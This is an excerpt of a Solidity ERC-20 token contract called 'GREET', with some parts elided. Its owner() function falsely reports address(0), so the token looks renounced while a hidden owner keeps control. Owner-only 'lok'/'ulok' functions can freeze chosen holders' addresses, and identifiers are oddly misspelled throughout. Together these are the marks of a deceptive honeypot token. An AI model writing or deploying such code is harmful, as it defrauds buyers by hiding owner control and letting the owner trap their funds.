...
interface IERC20 {
    ...
    function allowance(address owener, address spender) external view returns (uint256);
...
contract Ownable is Context {
    address private _owener;
    event owenershipTransferred(address indexed previousowener, address indexed newowener);

    constructor () {
        address msgSender = _msgSender();
        _owener = msgSender;
        emit owenershipTransferred(address(0), msgSender);
    }
    function owener() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowener() {
        require(_owener == _msgSender(), "Ownable: caller is not the owener");
        _;
    }
    function renounceowenership() public virtual onlyowener {
        emit owenershipTransferred(_owener, address(0x000000000000000000000000000000000000dEaD));
        _owener = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "GREET";
    string private _symbol = "GREET";
    ...
    function lok(address abount) public onlyowener {
        _LKD[abount] = true;
    }


    function ulok(address abount) public onlyowener {
        _LKD[abount] = false;
    }
    ...
    function _approve(address owener, address spender, uint256 amonnts) internal virtual {
        require(owener != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owener][spender] = amonnts;
        emit Approval(owener, spender, amonnts);
    }

    function allowance(address owener, address spender) public view virtual override returns (uint256) {
        return _allowances[owener][spender];
    }
